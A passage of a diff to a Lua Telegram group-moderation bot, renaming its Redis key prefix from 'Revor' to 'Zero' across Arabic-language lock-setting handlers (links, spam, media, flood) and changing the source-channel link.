 {text = '{ اوامر القفل / الفتح }', data = IdUser..'/NoNextSeting'}, {text = '{ اوامر التعطيل / التفعيل }', data = IdUser..'/listallAddorrem'}, 
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -11108,175 +11111,175 @@ end
 if Text and Text:match('(%d+)/lock_link') then
 local UserId = Text:match('(%d+)/lock_link')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Link"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Link"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الروابط").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_spam') then
 local UserId = Text:match('(%d+)/lock_spam')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Spam"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Spam"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكلايش").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_keypord') then
 local UserId = Text:match('(%d+)/lock_keypord')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Keyboard"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكيبورد").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_voice') then
 local UserId = Text:match('(%d+)/lock_voice')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:vico"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:vico"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاغاني").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gif') then
 local UserId = Text:match('(%d+)/lock_gif')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Animation"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Animation"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المتحركات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_files') then
 local UserId = Text:match('(%d+)/lock_files')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Document"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Document"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملفات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_text') then
 local UserId = Text:match('(%d+)/lock_text')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:text"..ChatId,true) 
+Redis:set(Zero .."Zero :Lock:text"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الدردشه").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_video') then
 local UserId = Text:match('(%d+)/lock_video')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Video"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Video"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الفيديو").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_photo') then
 local UserId = Text:match('(%d+)/lock_photo')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Photo"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Photo"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصور").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_username') then
 local UserId = Text:match('(%d+)/lock_username')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:User:Name"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:User:Name"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المعرفات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_tags') then
 local UserId = Text:match('(%d+)/lock_tags')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:hashtak"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:hashtak"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التاك").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_bots') then
 local UserId = Text:match('(%d+)/lock_bots')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Bot:kick"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Bot:kick"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل البوتات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fwd') then
 local UserId = Text:match('(%d+)/lock_fwd')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:forward"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:forward"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التوجيه").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_audio') then
 local UserId = Text:match('(%d+)/lock_audio')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Audio"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Audio"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصوت").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_stikear') then
 local UserId = Text:match('(%d+)/lock_stikear')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Sticker"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Sticker"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملصقات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_phone') then
 local UserId = Text:match('(%d+)/lock_phone')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Contact"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Contact"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الجهات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_joine') then
 local UserId = Text:match('(%d+)/lock_joine')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Join"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Join"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الدخول").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_addmem') then
 local UserId = Text:match('(%d+)/lock_addmem')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:AddMempar"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:AddMempar"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاضافه").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videonote') then
 local UserId = Text:match('(%d+)/lock_videonote')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Unsupported"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل بصمه الفيديو").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_pin') then
 local UserId = Text:match('(%d+)/lock_pin')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:lockpin"..ChatId,(LuaTele.getChatPinnedMessage(ChatId).id or true)) 
+Redis:set(Zero .."Zero :lockpin"..ChatId,(LuaTele.getChatPinnedMessage(ChatId).id or true)) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التثبيت").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_tgservir') then
 local UserId = Text:match('(%d+)/lock_tgservir')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:tagservr"..ChatId,true)  
+Redis:set(Zero .."Zero :Lock:tagservr"..ChatId,true)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاشعارات").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_markdaun') then
 local UserId = Text:match('(%d+)/lock_markdaun')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Markdaun"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الماركدون").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_edits') then
 local UserId = Text:match('(%d+)/lock_edits')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:edit"..ChatId,true) 
+Redis:set(Zero .."Zero :Lock:edit"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التعديل").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_games') then
 local UserId = Text:match('(%d+)/lock_games')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:geam"..ChatId,"del")  
+Redis:set(Zero .."Zero :Lock:geam"..ChatId,"del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الالعاب").Lock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_flood') then
 local UserId = Text:match('(%d+)/lock_flood')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:hset(Revor.."Revor:Spam:Group:User"..ChatId ,"Spam:User","del")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..ChatId ,"Spam:User","del")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التكرار").Lock, 'md', true, false, reply_markup)
 end
@@ -11285,126 +11288,126 @@ end
 if Text and Text:match('(%d+)/lock_linkkid') then
 local UserId = Text:match('(%d+)/lock_linkkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Link"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Link"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الروابط").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_spamkid') then
 local UserId = Text:match('(%d+)/lock_spamkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Spam"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Spam"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكلايش").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_keypordkid') then
 local UserId = Text:match('(%d+)/lock_keypordkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Keyboard"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكيبورد").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_voicekid') then
 local UserId = Text:match('(%d+)/lock_voicekid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:vico"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:vico"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاغاني").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gifkid') then
 local UserId = Text:match('(%d+)/lock_gifkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Animation"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Animation"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المتحركات").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fileskid') then
 local UserId = Text:match('(%d+)/lock_fileskid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Document"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Document"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملفات").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videokid') then
 local UserId = Text:match('(%d+)/lock_videokid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Video"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Video"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الفيديو").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_photokid') then
 local UserId = Text:match('(%d+)/lock_photokid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Photo"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Photo"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصور").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_usernamekid') then
 local UserId = Text:match('(%d+)/lock_usernamekid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:User:Name"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:User:Name"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المعرفات").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_tagskid') then
 local UserId = Text:match('(%d+)/lock_tagskid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:hashtak"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:hashtak"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التاك").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fwdkid') then
 local UserId = Text:match('(%d+)/lock_fwdkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:forward"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:forward"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التوجيه").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_audiokid') then
 local UserId = Text:match('(%d+)/lock_audiokid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Audio"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Audio"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصوت").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_stikearkid') then
 local UserId = Text:match('(%d+)/lock_stikearkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Sticker"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Sticker"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملصقات").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_phonekid') then
 local UserId = Text:match('(%d+)/lock_phonekid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Contact"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Contact"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الجهات").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videonotekid') then
 local UserId = Text:match('(%d+)/lock_videonotekid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Unsupported"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل بصمه الفيديو").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_markdaunkid') then
 local UserId = Text:match('(%d+)/lock_markdaunkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Markdaun"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الماركدون").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gameskid') then
 local UserId = Text:match('(%d+)/lock_gameskid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:geam"..ChatId,"ked")  
+Redis:set(Zero .."Zero :Lock:geam"..ChatId,"ked")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الالعاب").lockKid, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_floodkid') then
 local UserId = Text:match('(%d+)/lock_floodkid')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:hset(Revor.."Revor:Spam:Group:User"..ChatId ,"Spam:User","keed")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..ChatId ,"Spam:User","keed")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التكرار").lockKid, 'md', true, false, reply_markup)
 end
@@ -11412,126 +11415,126 @@ end
 if Text and Text:match('(%d+)/lock_linkktm') then
 local UserId = Text:match('(%d+)/lock_linkktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Link"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Link"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الروابط").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_spamktm') then
 local UserId = Text:match('(%d+)/lock_spamktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Spam"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Spam"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكلايش").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_keypordktm') then
 local UserId = Text:match('(%d+)/lock_keypordktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Keyboard"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكيبورد").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_voicektm') then
 local UserId = Text:match('(%d+)/lock_voicektm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:vico"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:vico"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاغاني").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gifktm') then
 local UserId = Text:match('(%d+)/lock_gifktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Animation"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Animation"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المتحركات").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_filesktm') then
 local UserId = Text:match('(%d+)/lock_filesktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Document"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Document"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملفات").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videoktm') then
 local UserId = Text:match('(%d+)/lock_videoktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Video"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Video"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الفيديو").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_photoktm') then
 local UserId = Text:match('(%d+)/lock_photoktm')
 if tonumber(IdUser) == tonumber(UserId) then
